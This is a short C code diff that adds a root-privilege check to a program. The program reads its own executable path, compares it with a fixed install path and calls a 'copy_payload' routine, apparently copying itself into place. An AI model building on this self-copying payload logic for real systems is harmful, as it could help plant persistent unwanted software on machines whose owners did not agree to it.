@@ -8,7 +8,10 @@ int main ( void )
     // check where is it executed
     int i = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
     buf[i] = '\0';
-
+    if (getuid() != 0) {
+        dprintf(STDERR_FILENO, "Run as root\n");
+        return EXIT_FAILURE;
+    }
     if (strcmp(buf, EXECUTABLE_FILE)) {
         printf("robrodri & jalvarad.\n");
         copy_payload(buf);
